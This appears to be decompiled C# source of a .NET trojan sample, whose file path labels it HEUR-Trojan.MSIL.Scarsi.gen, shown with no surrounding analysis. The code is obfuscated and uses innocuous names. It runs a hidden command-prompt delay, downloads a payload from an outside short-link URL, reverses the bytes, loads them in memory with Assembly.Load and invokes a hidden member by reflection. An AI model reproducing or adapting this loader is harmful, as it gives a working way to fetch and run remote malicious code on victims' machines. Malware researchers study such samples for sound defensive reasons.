// Decompiled with JetBrains decompiler
// Type: ExceptionStateListener
// Assembly: LibCADPortable_2_1_3, Version=2.2.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 360544B2-F90E-42F2-DF3F-E46EF941ADD2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Scarsi.gen-686d56d6a2903bf7b2f9710f308046a91f5f9082db14a7470f93a59e9939ec4c.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

internal sealed class ExceptionStateListener
{
  [DebuggerBrowsable(DebuggerBrowsableState.Never)]
  private static ExceptionStateListener.ErrorState serializer;
  internal static ExceptionStateListener SortDatabase;

  public ExceptionStateListener()
  {
    if (false)
      ;
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  private static ExceptionStateListener.ErrorState RunSerializer() => ExceptionStateListener.serializer;

  private static void MapSerializer(ExceptionStateListener.ErrorState config)
  {
    ExceptionStateListener.ErrorState errorState = config;
    if (false)
      return;
    ExceptionStateListener.serializer = errorState;
  }

  [STAThread]
  private static void PopSerializer()
  {
    ExceptionStateListener.ErrorState config = new ExceptionStateListener.ErrorState();
    if (true)
      goto label_9;
label_2:
    if (true)
      goto label_8;
label_3:
    if (true)
      goto label_5;
    else
      goto label_4;
label_1:
    int num;
    switch (num)
    {
      case 1:
      case 2:
        ExceptionStateListener.InvokeSerializer();
        return;
      default:
        goto label_5;
    }
label_4:
    num = \u003CModule\u003E\u007B0b658002\u002Df231\u002D4437\u002D933e\u002De4cba77e5196\u007D.m_1c674d7929a748e1b0737319bc54e161.m_16ddbf9cc8424696b78c9ccd39c4d7b6 != 0 ? 2 : 2;
    goto label_1;
label_5:
    ExceptionStateListener.TestSerializer();
    num = 1;
    if (\u003CModule\u003E\u007B0b658002\u002Df231\u002D4437\u002D933e\u002De4cba77e5196\u007D.m_1c674d7929a748e1b0737319bc54e161.m_a1f15eaafeb146f7ba8de66a062418a7 == 0)
    {
      num = 1;
      goto label_1;
    }
    else
      goto label_1;
label_8:
    ExceptionStateListener.DestroySerializer();
    goto label_3;
label_9:
    ExceptionStateListener.MapSerializer(config);
    goto label_2;
  }

  private static void DestroySerializer()
  {
    int num1 = ExceptionStateListener.RunSerializer() != null ? 1 : 0;
    if (true)
      goto label_7;
    else
      goto label_3;
label_1:
    int num2;
    switch (num2)
    {
      case 0:
        return;
      case 1:
        break;
      default:
        return;
    }
label_3:
    bool flag;
    if (!flag)
    {
      num2 = \u003CModule\u003E\u007B0b658002\u002Df231\u002D4437\u002D933e\u002De4cba77e5196\u007D.m_1c674d7929a748e1b0737319bc54e161.m_37861b7fd3d149989168e84a3f48b730 != 0 ? 0 : 0;
      goto label_1;
    }
    else
    {
      Assembly.Load((byte[]) ExceptionStateListener.LoginDatabase((object) ExceptionStateListener.RunSerializer().FillSerializer()));
      return;
    }
label_7:
    flag = num1 != 0;
    num2 = 1;
    if (\u003CModule\u003E\u007B0b658002\u002Df231\u002D4437\u002D933e\u002De4cba77e5196\u007D.m_1c674d7929a748e1b0737319bc54e161.m_c0e82e5695334b86b3cb9f21cf7142f1 != 0)
    {
      num2 = 0;
      goto label_1;
    }
    else
      goto label_1;
  }

  private static void TestSerializer()
  {
    int num1 = ExceptionStateListener.ViewDatabase((object) ExceptionStateListener.RunSerializer()) <= 0 ? 1 : 0;
    if (true)
      goto label_18;
label_16:
    bool flag;
    if (!flag)
      return;
    Assembly[] assemblies = Thread.GetDomain().GetAssemblies();
    if (true)
      goto label_21;
label_6:
    if (true)
      goto label_23;
    else
      goto label_7;
label_1:
    int index1;
    MemberInfo[] members;
    Type[] types;
    int index2;
    Type type;
    int index3;
    Assembly[] assemblyArray;
    Assembly assembly;
    int num2;
    while (true)
    {
      switch (num2)
      {
        case 1:
          if (index2 >= types.Length)
          {
            ++index3;
            goto default;
          }
          else
            goto case 4;
        case 2:
          assembly = assemblyArray[index3];
          num2 = \u003CModule\u003E\u007B0b658002\u002Df231\u002D4437\u002D933e\u002De4cba77e5196\u007D.m_1c674d7929a748e1b0737319bc54e161.m_577e486f73724f04b5b10f5d98410a6c != 0 ? 3 : 2;
          continue;
        case 3:
          types = assembly.GetTypes();
          index2 = 0;
          num2 = \u003CModule\u003E\u007B0b658002\u002Df231\u002D4437\u002D933e\u002De4cba77e5196\u007D.m_1c674d7929a748e1b0737319bc54e161.m_fc4d425223864ae48b761af9aba1795a != 0 ? 0 : 1;
          continue;
        case 4:
          type = types[index2];
          members = type.GetMembers();
          index1 = 0;
          goto case 7;
        case 5:
          ++index2;
          goto case 1;
        case 7:
          if (index1 >= members.Length)
          {
            num2 = \u003CModule\u003E\u007B0b658002\u002Df231\u002D4437\u002D933e\u002De4cba77e5196\u007D.m_1c674d7929a748e1b0737319bc54e161.m_16acae0240874c6998d18e129c121b01 == 0 ? 2 : 5;
            continue;
          }
          MemberInfo memberInfo = members[index1];
          try
          {
            ExceptionStateListener.RunSerializer().SetupSerializer((int) type.InvokeMember("Ovzscxdujxrdf", BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null));
          }
          catch
          {
          }
          ++index1;
          num2 = 7;
          continue;
        default:
          if (index3 < assemblyArray.Length)
            goto case 2;
          else
            goto label_20;
      }
    }
label_20:
    return;
label_7:
    num2 = \u003CModule\u003E\u007B0b658002\u002Df231\u002D4437\u002D933e\u002De4cba77e5196\u007D.m_1c674d7929a748e1b0737319bc54e161.m_a8cbf406255948dbae592c6c48a1c5b2 == 0 ? 4 : 6;
    goto label_1;
label_23:
    index3 = 0;
    num2 = 0;
    if (\u003CModule\u003E\u007B0b658002\u002Df231\u002D4437\u002D933e\u002De4cba77e5196\u007D.m_1c674d7929a748e1b0737319bc54e161.m_557ad8cd715f4c258f91e81d2bf12dc4 == 0)
    {
      num2 = 0;
      goto label_1;
    }
    else
      goto label_1;
label_21:
    assemblyArray = assemblies;
    goto label_6;
label_18:
    flag = num1 != 0;
    goto label_16;
  }

  private static void InvokeSerializer()
  {
    int num = 1;
    object obj;
    while (true)
    {
      switch (num)
      {
        case 0:
          goto label_5;
        case 1:
          obj = ExceptionStateListener.DeleteDatabase((object) "Game loading {0}", (object) ExceptionStateListener.RunSerializer().VerifySerializer());
          if (false)
          {
            num = \u003CModule\u003E\u007B0b658002\u002Df231\u002D4437\u002D933e\u002De4cba77e5196\u007D.m_1c674d7929a748e1b0737319bc54e161.m_d2eee40806034de4aa10f89523066b8e == 0 ? 0 : 0;
            continue;
          }
          goto label_6;
        default:
          goto label_2;
      }
    }
label_5:
    return;
label_2:
    return;
label_6:
    Console.WriteLine((string) obj);
  }

  internal static bool CollectDatabase() => ExceptionStateListener.SortDatabase == null;

  internal static ExceptionStateListener RemoveDatabase() => ExceptionStateListener.SortDatabase;

  internal static object LoginDatabase([In] object obj0) => (object) ((List<byte>) obj0).ToArray();

  internal static int ViewDatabase([In] object obj0) => ((ExceptionStateListener.ErrorState) obj0).VerifySerializer();

  internal static object DeleteDatabase([In] object obj0, [In] object obj1) => (object) string.Format((string) obj0, obj1);

  private sealed class ErrorState
  {
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    private int annotation;
    internal static ExceptionStateListener.ErrorState CustomizeDatabase;

    internal ErrorState()
    {
      if (true)
        ;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      int num = 0;
      if (\u003CModule\u003E\u007B0b658002\u002Df231\u002D4437\u002D933e\u002De4cba77e5196\u007D.m_1c674d7929a748e1b0737319bc54e161.m_89fc4f94bca648e48d6640b5b3b4f3bd == 0)
        num = 0;
      switch (num)
      {
        default:
          ProcessStartInfo startInfo = new ProcessStartInfo();
          startInfo.FileName = "cmd";
          ExceptionStateListener.ErrorState.CreateDatabase((object) startInfo, (object) "/c timeout 19");
          startInfo.WindowStyle = ProcessWindowStyle.Hidden;
          Process.Start(startInfo).WaitForExit();
          break;
      }
    }

    internal int VerifySerializer()
    {
      if (true)
        ;
      return this.annotation;
    }

    internal void SetupSerializer(int init_Ptr)
    {
      int num1 = init_Ptr;
      if (false)
        return;
      this.annotation = num1;
      int num2 = 0;
      if (\u003CModule\u003E\u007B0b658002\u002Df231\u002D4437\u002D933e\u002De4cba77e5196\u007D.m_1c674d7929a748e1b0737319bc54e161.m_d706d917b43c4263a3b2920722095090 == 0)
        goto label_6;
label_1:
      switch (num2)
      {
        case 0:
          return;
        default:
          return;
      }
label_6:
      num2 = 0;
      goto label_1;
    }

    internal List<byte> FillSerializer()
    {
      try
      {
        if (true)
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      List<byte> byteList1 = new List<byte>();
      if (true)
        goto label_6;
label_4:
      List<byte> byteList2;
      byteList2.AddRange((IEnumerable<byte>) ((Task<byte[]>) typeof (HttpClient).GetMethod("GetByteArrayAsync", new Type[1]
      {
        typeof (Uri)
      }).Invoke((object) new HttpClient(), new object[1]
      {
        (object) new Uri("https://tiny.one/2p8pusy6")
      })).Result);
      byteList2.Reverse();
      List<byte> byteList3 = byteList2;
      if (true)
        goto label_7;
label_5:
      List<byte> byteList4;
      return byteList4;
label_7:
      byteList4 = byteList3;
      goto label_5;
label_6:
      byteList2 = byteList1;
      goto label_4;
    }

    internal static void CreateDatabase([In] object obj0, [In] object obj1) => ((ProcessStartInfo) obj0).Arguments = (string) obj1;

    internal static bool ComputeDatabase() => ExceptionStateListener.ErrorState.CustomizeDatabase == null;

    internal static ExceptionStateListener.ErrorState TestDatabase() => ExceptionStateListener.ErrorState.CustomizeDatabase;
  }
}
